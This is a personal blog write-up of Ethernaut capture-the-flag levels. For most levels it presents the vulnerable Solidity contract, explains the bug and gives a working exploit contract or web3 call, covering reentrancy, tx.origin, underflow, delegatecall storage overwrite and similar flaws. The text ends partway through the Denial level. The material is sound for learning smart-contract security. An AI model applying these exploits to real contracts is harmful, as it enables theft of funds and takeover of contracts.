+++
title = "The Ethernaut"
description = " My approch towards the CTF challanges "
date = 2022-10-27T07:34:48+08:30
featured = false
draft = false
comment = false
toc = false
reward = true
categories = [ "Ethernaut", "Solidity", "Security", "CTF", "Smart Contract", "Web3" ]
tags = [ "" ]
series = []
images = ["files/logo.png"]
+++

Sup!?

Hey, there! long time no see ah? I forgot to tell you that now I'm currently learning blockchain security related stuff. I'm able to solved some challenges from Ethernaut CTF and I took previous writeups help to understand remaining.

Some of my seniors @S3v3ru5*, @D1r3w0lf, @Sud0u53r and @S1r1u5* are doing in blockchain security and suggested me to solve these challenges to learn about basic bugs in solidity. Unlike web2 CTFs, Ethernaut is a Web3/Solidity based and played in Ethereum Virtual Machine (EVM). Each level is a smart contract that needs to be ‘hacked’.

I have read Mastering Ethereum book and a blog series about EVM bytecode and how solidity uses EVM storage. They made some challenges easier for me, so I recommend you to read them before getting started with the CTF.

### Hello Ethernaut

This is an introductory challenge. Challenge description mentions the method name of the contract to call. calling that method from browser console gives information about another method. and we just need to follow the rabit and then authenticate. The password is "ethernaut0".

### Fallback

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

- Our goal is to claim ownership of the contract and to reduce its balance to 0. To do that, we have to call the fallback function receive(), where the owner is set to msg.sender.
- To pass the require check in receive function, we have to contribute some ether to the contract using the contribute() function and then call the contract with empty data field to trigger receive function.
- To reduce the balance to 0, we simply have to call withdraw() function and it will transfer all the amount to our account.

```js
// Exploit
await web3.eth.sendTransaction({
  from: player,
  to: contract.address,
  data: web3.eth.abi.encodeFunctionSignature("contribute()"),
  value: 10 ** 14,
});
await web3.eth.sendTransaction({
  from: player,
  to: contract.address,
  data: "",
  value: 10 ** 10,
});
await contract.withdraw();
```

### Fallout

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {

  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

The flaw in this contract is that the constructor name is misspelled so the solidity considers it a function rather than constructor. Now we can simply call the function Fal1out() to become the owner of the contract.
So,

```js
await contract.Fal1Out();
```

### Coin Flip

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

We have to call flip method with a guess and it is considered a win if our guess matches with the contract calculated guess. we have to guess the flip correctly 10 times in line to complete the challenge. The bug is in the calculation of the contract filp, it is calculated solely based on the block hash of the block the transaction is in. The block hash will be same for every other transaction included in the same block as the flip method call transaction. so, the idea is to calculate the "guess" using our exploit smart contract and call the challenge smart contract using message call with the calculated guess.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface COINFLIP{
  function flip(bool _guess) external returns (bool);
}

contract Attack {
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  COINFLIP cF = COINFLIP(0xEf226d8FB965d6DA727fE8794d94f9746E18b060);

  function calculateFlip() public {
    uint256 blockValue = uint256(blockhash(block.number -  1 ));
    uint256 flip = blockValue / FACTOR;
    bool guess = flip == 1 ? true : false;
    require(cF.flip(guess));
  }
}
```

"calculateFlip" should be called in 10 different transactions one after other as every flip method call should be in a different block.

### Telephone

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

We have to become the owner of the challenge contract. Anyone can call the changeOwner with a new owner address but to change the owner to passed "\_owner" argument, a condition must be true which is

```solidity
    if (tx.origin != msg.sender)
```

"tx.origin" is equal to the address created the transaction and "msg.sender" is equal to the address which created the message. Calling another contract is also a message call. so, when we call a different smart contract which inturn calls the challenge contract, the "tx.origin" will be our address whereas the "msg.sender" will be the address of intermediate smart contract.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface phone{
  function changeOwner(address owner) external;
}

contract Attack {
    phone call = phone(0x2346f30C90d0b3a947457A8BE69A5A835330aDda);
    function attack(address myAddress) public {
        call.changeOwner(myAddress);
    }
}
```

### Token

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

Intially, we have 20 tokens which are represented using "balances" map. The contract also has methods to transfer and check balance of an address. To complete this challenge we should have more tokens in our balance than the intial amount. The bug is in the "transfer" function, before subtracting the transfered amount from the sender's balance it doesn't check correctly whether the sender has sufficient balance or not. As a result, If we set \_value parameter to some number greater than 20 (for example, 21), balances\[msg.sender] - 21 = -1, which will be 2\*\*256 - 1, since the datatype of balance is uint256. So, the require check is bypassed and our balance will become 2\*\*256 - 1.

```js
await contract.transfer(instance, 21);
```

### Delegation

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

The fallback function has a delegate call to "Delegate" contract. In delegate call, the code present in the called contract is executed in the context of caller contract. The context includes storage and msg object among others. contract storage is presistent, it's a way to store contract state between different message calls. storage can be viewed as a large mapping from "uint" to bytes32. So, whenever a state variable is read or written it is done so by reading or writing to storage slot(index) assigned to that variable. Similarly, when the code modifying state variables is executed in delegate call, the storage slot of caller contract corresponding to that state variable in the called contract is modified. For example, "pwn" function in the "Delegate" contract modifies "owner" state variable which is stored in "0" storage slot. when the "pwn" function is executed using delegate call in "Delegation" contract's fallback function, the storage slot of "Delegation" contract is read and modified not the storage slot of "Delegate" contract. As the storage slot "0" of "Delegation" contract corresponds to it's "owner" variable, delegate call to "pwn" function will modify the "Delegation" contract's "owner" variable, which is what we need to pass this challenge.

To call "pwn" function, we have to compute encoded function signature of "pwn" function in message data. Encoded function signature is first 4 bytes of keccak256 hash of function signature. It is used to identify the function in the called contract. And to call the "pwn" function in delegate call, we have to pass it's signature in message data.
The final exploit is

```js
await sendTransaction({ from: player, to: instance, data: "0xdd365b8b" });
```

### Force

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

To complete this challenge, the challenge contract should have some amount of ether. We cannot send ether to this contract like we do for other contracts, that's because, a contract function should be defined as payable to receive ether. And there are no payable functions in this contract. Even though solidity compiler puts default implementations of "receive" and "fallback", they are not payable by default. so, we cannot send ether using any kind of message call.

But there are two other ways using which we can send ether. We can send ether to the contract before the contract is deployed. The address of the deployed contract can be calculated as it only depends on the deployer address and nonce. And if we send ether to that address before the contract is deployed, there will be no code at that address and the transaction will not be reverted. The message calls containing ether are only reverted because solidity by default adds conditions for non-payable functions to check that "msg.value" is 0, but if the code is not yet deployed, then the transaction will not be reverted. Another way is by using selfdestruct. when a contract calls self destruct, all it's balance is transfered to the address given as it's argument and even if a smart contract presents at the given address, no function is called, as a result ether is sent to that contract.

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;
contract Attack {

    fallback() external payable{}
    receive() external payable{}

    function attack() public payable {
        selfdestruct(payable(0x6A91c42b1179226B3A80087CD84B8966d13c650f));
    }
}
```

### Vault

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

We have to set "locked" variable to "false" to complete this challenge. To unlock the contract, we can use unlock method but it requires a password. password is stored in "password" private variable. Even if the password is "private", we can read it's value. The difference between "public" and "private" variable is not that "public" variables can be read by anyone and "private" variables can only be read by the contract. What it means is that, when a variable is marked "public" in solidity, solidity compiler creates public getter function for that variable and won't create for "private" variables. Irrespective of variable visibility, all the state variables are stored in storage of the contract. And contract storage is part of the blockchain state, which anyone can read with access to a network node. But the benefit of declaring variables "private" is that, they cannot be read by other smart contracts. To be exact, no contract can read other contracts storage, so, to allow reading public variables solidity creates public getter function which allow reading public variables using a message call. "web3" provides helper functions to read storage of an address based on the slot number. "password" variable is stored in storage slot 1 and using web3 we can read the password and call unlock with it.

```js
password = await web3.eth.getStorageAt(instance, 1);
```

### King

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

Anyone can become the king in the challenge contract if they send more ether than the present king's ether. To complete this challenge, we have to block anyone else from becoming the king, even if they send large amount of ether. We can do that by using the "fallback" function. remember that, when ether is sent with empty data or false data, one of the fallback function is called and if the fallback function "reverts" everytime, then it won't be possible to transfer ether using "transfer" function. The challenge contract's receive function transfer's the previous king's ether before updating the king to the new one. So, if the previous king's ether transfer fails everytime, then no one can become the king.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;


interface king {
    receive() external payable;
}

contract attack{
    king k;
    constructor() payable{
        k = king(payable(0x835DB5ACA5A72665A385ea66ca446AA7f47F2b30));
        address(k).call{value: msg.value}("");
    }

    receive () external payable{
        revert("goto back");
    }

}
```

### Re-entrancy

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {

  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

To complete this challenge, we have to steal all the ether present in the contract's account. The bug is in the "withdraw" function. Even though, it checks whether the withdraw amount is greater then the balance, the state i.e balance after withdraw, is only updated after sending the ether by making an "external call". To see why this is dangerous, remember that we can implement "fallback" functions which will be called when data field is empty or it doesn't match any function signature. So, when the challenge contract sends ether, if receiving account is not a externally owned account, then that account has the ability to transfer the execution to any other contract or just finish and return to the challenge contract. if the "fallback" function just returns without doing anything then everything works as intended but if "fallback" function calls "withdraw" function again, as the balance is not yet updated, it will result in the transfer of ether using "call" to the same contract. recursively, we can steal all the ether present in the challenge contract. Note that, "call" transfers all the available gas when not set explicitly and this attack could be prevented by sending particular amount of gas not enough for re-entrancy.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface Re {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract attack {
    Re reentrace;

    constructor() payable public {
        reentrace = Re(0xB041a6080273501b83218302E75fA5e7b9D8aCa4);
        reentrace.donate{value: msg.value}(address(this));
    }

    function withdraw() payable public {
        reentrace.withdraw(0.001 ether);
    }

    fallback() external payable {
        reentrace.withdraw(0.001 ether);
    }
}
```

### Elevator

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

we have to set "top" variable to true to pass this challenge. "goTo" function is expected to be called from a Building contract and to set "top" to "true", on the first call of "isLastFloor", it has to return "false" and on the second call, it should return "true". We can use a state variable to track "isLastFloor" calls and return appropriate boolean based on that.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface elevator{
    function goTo(uint _floor) external;
}

contract Attack {
    bool top = true;

    elevator el;

    constructor(){
        el = elevator(0xA06C21cf156f0741F2c8F0CaeA78f8F901178F00);
    }

    function attack() public {
        el.goTo(10);
    }

    function isLastFloor(uint) public returns (bool) {
        top = !top;
        return top;
    }
}
```

### Privacy

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }

  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

This challenge is similar "Vault" challenge, in this we have to read private "data" variable and call "unlock" function with it. solidity follows few rules while allocating storage slots to state variables, they can be best understood by reading through solidity docs, you can find them \[[here](https://docs.soliditylang.org/en/v0.8.9/internals/layout_in_storage.html)\].

The "data[2]" is stored at slot 5 and bytes16 of bytes32 value returns first 16 bytes. so, we can read the slot 5 and call unlock using most significant 16 bytes.

### Gatekeeper One

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

This challenge requires us to pass 3 gates, each representing a condition using modifiers and require statements. "gateOne" is the same condition as "Telephone" challenge. coming to "gateTwo", it checks if gasleft modulo 8191 is 0 or not. gasleft is the amount of gas remaining for rest of the execution. When calling from a contract, we can set the amount of gas we want to forward, so, that gas amount can be bruteforced until this check passes. "gateThree" depends on the uint conversion. When a uint is converted to a lower size "uint", the resulting value will be lower size bits of the original value. So, to pass

```solidity
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
```

uint16 takes lower 16 bits, whereas uint32 takes lower 32 bits, to make them to be equal we can set bits 16-31 to 0 given bits are numbered with lsb as 0.

```solidity
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
```

upper 32 bits of uint64(\_gateKey) should not be 0. The last check is

```solidity
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
```

This requires lower 16 bits to be equal lower 16 bits of tx.origin.

final exploit is

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
contract Hack {
    bytes8 key = bytes8(0x6cC879AdbCEF2aEC) & 0xFFFFFFFF0000FFFF;
//  bytes8 public m = bytes8(abi.encodePacked(tx.origin)) & 0xFFFFFFFF0000FFFF;
    function enterGate() public {
        for(uint i=0;i<120;i++){
            address(0xf36D7330A95B42B0356932e670eB6c3600ceb146).call{gas:i+150+8191*3}(abi.encodeWithSignature("enter(bytes8)", key));
        }
    }
}
```

### Gatekeeper Two

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

This challenge as above challenge requires us to pass three gates. first gate is same while second gate checks if the caller is smart contract or not. "extcodesize" returns the length of the code in bytes at the given address, this gate requires it to be 0. But "gateOne" requires caller to be a smart contract. The solution for this is to call this contract from the constructor. When called from the constructor, the contract's final code is not yet returned to the evm and it will only be done after finishing this call, as a result the codesize will still be 0 at the caller's address. so, "extcodesize" returns 0 when called from the constructor allowing us to pass this gate. "gateThree" checks the passed "gateKey" using "xor" operation. we can change the variables in the equation and find the required "gateKey" easily.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
contract attack {
    constructor(){
        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1));
        //bytes8 key = bytes8(abi.encodePacked(_gateKey));
        address(0x0B612B4DbFb524B6a9a866f4Af1eA702E96c4591).call(abi.encodeWithSignature("enter(bytes8)", _gateKey));
    }
}
```

### Naught Coin

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player)
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }

  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  }
}
```

NaughtCoin is a ERC20 token and we have to make our NaughtCoin balance to 0 to complete this challenge. Implementation of NaughtCoin overrides "transfer" function of ERC20. Main change is that an extra check is added for the "transfer" function to only allow us("player") to withdraw the tokens after a certain timelock period. Any user other than the player can withdraw their tokens irrespective of timelock period. So, to complete this challenge, we have to use another way of spending ERC20 tokens. ERC20 tokens, additional to simple transfer method, allows another user to spend the tokens of other uses if the other user explicitly allows the spender to spend certain number of tokens. It is done by using "approve" and "transferFrom" methods of ERC20 contract. So, to solve this challenge, we can approve different address that we own to spend our tokens and use "transferFrom" to transfer the tokens.

### Preservation

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress;
    timeZone2Library = _timeZone2LibraryAddress;
    owner = msg.sender;
  }

  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

Challenge contract stores addresses of two deployed contracts of LibraryContract. Functions "setFirstTime" and "setSecondTime" use delegate call to each of previously stored LibraryContract addresses and call "setTime" with "\_timeStamp" argument. As mentioned in "Delegation" challenge writeup, when calling a contract using a delegate call, only the code is taken from the called contract and storage, msg referred in the code are still the caller's contract."setTime" updates "storedTime" which will be stored at storage slot 0. So, when "setTime" is called using delegate call, storage slot 0 of caller contract i.e challenge contract, will be written with our given time. storage slot 0 in "Preservation" contract is used to store contract address of "timeZone1Library", which means that we can overwrite the contract address to our desired value and when "setFirstTime" is called again, it will delegate call to overwritten address. We can deploy our malicious contract which will update owner when "setTime" is called using delegate call.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract attact{
    address public slot0;
    address public slot1;
    address public slot2_owner;

    function setTime(uint fuckwaste) public{
        slot2_owner = address(0x508281E39fF6c0aB776d773e6cC879AdbCEF2aEC);
    }
}
```

### Recovery

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);

  }
}

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public {
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

SimpleToken contract is deployed in the "generateToken" function of Recovery contract. we have to find it's address and call destroy method of SimpleToken to complete this challenge. Whenever a contract is deployed, the address is calculated solely using sender's address and nonce. nonce represents number of the present transaction sent using that account. So, when simpleToken contract is deployed using new, it's address is calculated using Recovery contract address and it's nonce. [This](https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed) stack overflow post provides implementations to compute the deployed address, given deployer's address and nonce. nonce is 1 for our SimpleToken deployement call.

python implementation taken from above mentioned post

```py
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
contract attack{
    constructor(){
        address(0xc3B095a1aB306541df81b201536331cbfDD80003).call(abi.encodeWithSignature("destroy(address)",address(0x508281E39fF6c0aB776d773e6cC879AdbCEF2aEC)));
    }
}
```

### MagicNumber

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract MagicNum {

  address public solver;

  constructor() public {}

  function setSolver(address _solver) public {
    solver = _solver;
  }

  /*
    ____________/\\\_______/\\\\\\\\\_____
     __________/\\\\\_____/\\\///////\\\___
      ________/\\\/\\\____\///______\//\\\__
       ______/\\\/\/\\\______________/\\\/___
        ____/\\\/__\/\\\___________/\\\//_____
         __/\\\\\\\\\\\\\\\\_____/\\\//________
          _\///////////\\\//____/\\\/___________
           ___________\/\\\_____/\\\\\\\\\\\\\\\_
            ___________\///_____\///////////////__
  */
}
```

We will pass this challenge if we provide an address where solver contract is deployed. solver contract's "whatIsTheMeaningOfLife" function should return magic number(42) when called but number of opcodes can be atmost 10. The bytes stored at a contract's address is evm bytecode and whenever the contract is called, that bytecode is executed in EVM. EVM doesn't store any additional information like function signatures and offset where their implementation starts. It's the job of the code at the contract address to dispatch to correct offset based on the message data. One can say that, the starting code of a deployed code is a large switch statement, dispatching calls to functions based on the 4 byte signature stored in the "msg.data" field. Our solver contract is called only once allowing us to remove the starting code and always return the magic number. EVM is a stack machine and [this](https://github.com/wolflo/evm-opcodes) lists all the available instructions and how top of the stack is changed for each instruction.

"RETURN" instruction returns data from memory of given length and present at given offset. So, we have to store the data(magic number) first in memory using "MSTORE" at some offset and return that using "RETURN".

```asm
PUSH1 0x2A ; push magic number onto the stack
PUSH1 0x0  ; push offset into memory
MSTORE     ; store data at given offset, mem[0x0] = 0x2A = 42
PUSH 0x20  ; push length of the data to return
PUSH 0x0   ; push memory offset to return the data from
RETURN     ; return data present at mem[0x0: 0x0 + 0x20]
```

We also have to write the code for constructor function. when the contract is deployed, the constructor code is usually present at the starting and it returns the final code which is stored at the smart contract address to the evm. So, our constructor has to return the bytes corresponding to the above instructions. codecopy instruction is used to copy the bytecode. Final bytecode is equivalent to

```asm
00: PUSH1 0x0a ; length         // 600a
02: DUP1                        // 80
03: PUSH1 0x0c ; codeoffset     // 600c
05: PUSH1 0x00                  // 6000
07: CODECOPY                    // 39
08: PUSH1 0x0                   // 6000
0a: RETURN                      // f3
0b: STOP                        // 00
0c: PUSH1 0x2A                  // 602A
0e: PUSH1 0x0                   // 6000
10: MSTORE     ; mem[0] = 0x2A  // 52
11: PUSH 0x20                   // 6020
13: PUSH 0x0                    // 6000
15: RETURN                      // f3
```

```
600a80600c6000396000f300602a60005260206000f3
```

### Alien Codex

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }

  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

AlienCodex inherits Ownable contract. Our challenge is to become the owner of the contract. "owner" variable is defined in Ownable contract and as AlienCodex inherits Ownable contract, owner variable is stored at storage slot 0. AlienCodex contract also declares a dynamic array "codex" and provides public functions to push a element, "decrement" the length and set given value at given index. The bug is in "retract" function, it decrements array length without checking if the length is greater then 0 or not. if the length is decremented when it is still 0, due to integer underflow it becomes $$2^{256} - 1$$. This helps because before accessing an element at an index, it checks that index is less than the length. So, if we make length equal to $$2^{256} - 1$$, we can read or write at any index and we can use that to write at storage slot 0 which holds owner variable's data.

When allocating storage for dynamic arrays, only the length is stored at the original slot(p) and the data is stored continously at "keccak256(p)". It means that when accessing the element, storage slot $$keccak256(p) + index$$ is accessed. The storage slot number is also stored in 256-bit, as a result when large index is used i.e $$keccak256(p) + index$$ is greater than $$2^{256} - 1$$, it overflows. With this and "revise" function, we can change owner variable stored at storage slot 0 .

### Denial

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
